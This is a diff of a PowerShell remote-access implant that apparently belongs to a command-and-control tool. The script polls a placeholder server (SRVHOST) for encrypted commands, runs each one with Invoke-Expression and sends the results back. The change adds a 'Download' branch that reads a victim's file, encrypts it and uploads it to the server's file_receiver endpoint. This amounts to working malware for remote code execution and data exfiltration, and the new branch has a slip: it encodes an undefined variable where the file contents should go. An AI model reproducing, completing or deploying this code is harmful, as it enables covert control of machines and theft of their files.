@@ -45,7 +45,6 @@ function DecryptCommand($key, $encryptedStringWithIV) {
     [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
 }
 
-# prepare the variables
 $progressPreference = 'silentlyContinue';
 $wc = New-Object system.Net.WebClient;
 $wc2 = New-Object system.Net.WebClient;
@@ -69,51 +68,34 @@ $wc.downloadString("OCU_PROTO://SRVHOST/first_ping");
 
 while($true){
     $command_raw = $wc2.downloadString("OCU_PROTO://SRVHOST/command/$final_hostname");
-    $command = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($command_raw));
-    if($command.split(" ")[0] -like "download"){
-    # we need to write a download operation here !
-    #Invoke-RestMethod -Uri OCU_PROTO://SRVHOST/file_receiver -Method Post -InFile $file_path -Headers @{"filename"="$file_name"};
-    #$file_path = $command.split(" ")[1];
-    #$file_content = Get-Content $file_path;
-    #$file_name = $file_path.split("\\")[-1];
-    #echo $file_content;
-    #$sEncodedString=[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($file_content));
-    #$postdata = @{data=$file_content};
-    #Invoke-WebRequest -Uri OCU_PROTO://SRVHOST/file_receiver -Method POST -Body $postdata -Headers @{"filename"="$file_name"}
-    }
+    $final_command = DecryptCommand $key $command_raw
+    $fc = $final_command.Trim([char]0).Trim([char]1).Trim([char]2).Trim([char]3).Trim([char]4).Trim([char]5).Trim([char]6).Trim([char]7).Trim([char]8).Trim([char]9).Trim([char]10).Trim([char]11).Trim([char]12).Trim([char]13).Trim([char]14).Trim([char]15).Trim([char]16).Trim([char]17).Trim([char]18).Trim([char]19).Trim([char]20).Trim([char]21)
 
-    elseif ($command -like "False"){
+    if($fc -eq "False"){
+      echo "DoNothig"
+    }elseif($fc.split(" ")[0] -eq "Download"){
+      $filename = EncryptCommand $key $fc.split("\")[-1]
 
-    }
-
-    elseif ($command -like "Delete"){
-
-    exit
-
-    }
-
-    else{
-
-    try{
-    $decrypted_command = (DecryptCommand $key $command);
-    $uencoding = [system.Text.Encoding]::UTF8
-    $bytes_array = $uencoding.GetBytes($decrypted_command.Trim([char]0x0008).Trim([char]0x0003).Trim([char]0x0000).Trim([char]0x0002).Trim([char]0x0005).Trim([char]0x0006).Trim([char]0x0007))
-    $en = [system.Text.Encoding]::ASCII
-    $final_command = $en.GetString($bytes_array)
-    $ec = Invoke-Expression ($final_command) | Out-String;
-    }
-    catch{
-    $ec = $Error[0] | Out-String;
-    }
-
-    $EncodedText = EncryptCommand $key $ec;
-    $wc3 = New-Object system.Net.WebClient;
-    $wc3.Headers.add("Authorization",$EncodedText);
-    $wc3.downloadString("OCU_PROTO://SRVHOST/command_receiver");
-
-
+      echo "Download order to file $filename"
+      $file_content = (Get-Content $fc.split(" ")[1] -Encoding byte)
+      $file_base64 =[Convert]::ToBase64String($Bytes)
+      $efc = EncryptCommand $key $file_base64
+      echo $efc;
+      $wc3 = new-object net.WebClient
+      $wc3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
+      $wc3.UploadString("http://SRVHOST/file_receiver", "fn=$filename&token=$efc")
+    }else{
+      try{
+        $ec = Invoke-Expression ($fc) | Out-String;
+        }
+        catch{
+        $ec = $Error[0] | Out-String;
+        }
+        $EncodedText = EncryptCommand $key $ec;
+        $wc3 = New-Object system.Net.WebClient;
+        $wc3.Headers.add("Authorization",$EncodedText);
+        $wc3.downloadString("OCU_PROTO://SRVHOST/command_receiver");
 
     }
     sleep $interval;
-
     }
